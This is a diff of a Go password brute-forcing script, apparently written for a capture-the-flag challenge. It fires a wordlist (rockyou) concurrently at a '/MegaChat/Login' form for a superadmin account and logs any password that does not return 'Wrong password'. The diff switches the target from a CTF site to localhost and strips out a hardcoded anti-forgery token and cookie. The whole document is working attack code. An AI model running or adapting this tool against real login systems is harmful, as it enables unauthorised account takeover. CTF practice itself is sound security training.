@@ -13,13 +13,11 @@ import (
 
 var (
 	goRoutinesNum = 50
-	mainUrl       = "https://ctf.iterasec.com" // should NOT end with "/"
-	// mainUrl       = "http://localhost:3333" // should NOT end with "/"
+	mainUrl       = "http://localhost:3333" // should NOT end with "/"
 )
 
 func main() {
 	file, err := os.Open("/usr/share/wordlists/rockyou2.txt")
-	// file, err := os.Open("/home/user1/hat/iterasec/level1/temp.txt")
 	if err != nil {
 		fmt.Println("Error:", err)
 		return
@@ -61,8 +59,7 @@ func flow(wg *sync.WaitGroup, pass string, count int) {
 
 	resp := makeHttpReq(
 		http.MethodPost,
-		mainUrl+"/MegaChat/Login", "Email=superadmin@gmail.com&Password="+pass+"&__RequestVerificationToken=CfDJ8JpY3kz6Eh9NieYOel7gYzpIx5vbvzABn3Z7u2qubBBq_3kLgxIm182WCQXj8xNYbJblKfH6yTa2XbIFDKsOy1_cR8ooeG51BuNPNAd9wpA12sh3NCgth-Sz6hDCNTkxzsGwvCr_FRa2cfg5vqeA63o",
-		".AspNetCore.Antiforgery.VyLW6ORzMgk=CfDJ8JpY3kz6Eh9NieYOel7gYzpUA86m92Hz7SkMz7sfKzz-l6HGnMIyVWvGBZwGDoaTnWhJI_C0AT6v1GRqNt6kRzFH-ByCFpL077low8md67QGiol4E-Ks7oUvnHWta-GlbI9kp9GHWg5eQ7JL_BEchck",
+		mainUrl+"/MegaChat/Login", "",
 		true,
 	)
 
@@ -80,7 +77,7 @@ func flow(wg *sync.WaitGroup, pass string, count int) {
 	}
 
 	if !strings.Contains(respBody, "Wrong password") {
-		f, err := os.OpenFile("/home/user1/hat/iterasec/level1/res.txt",
+		f, err := os.OpenFile("/home/user/res.txt",
 			os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 		if err != nil {
 			log.Println(err)
